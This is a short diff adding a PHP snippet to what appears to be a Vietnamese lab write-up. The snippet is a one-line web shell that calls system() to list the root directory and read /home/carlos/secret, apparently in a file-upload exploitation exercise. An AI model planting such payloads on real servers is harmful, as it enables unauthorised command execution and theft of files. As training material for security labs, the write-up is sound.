@@ -29,5 +29,9 @@
 
 ![image](https://github.com/user-attachments/assets/0aa164c4-3f86-43cf-9f9b-1a87a276ceb8)
 - Do biết được đường dẫn nên ta cat ra thôi:)))
+```php
+<?php system('ls / -la'); ?>
+<?php system('cat /home/carlos/secret'); ?>
+```
 
 ![image](https://github.com/user-attachments/assets/48398b45-dec5-4bab-afaa-bc0fff0ef635)
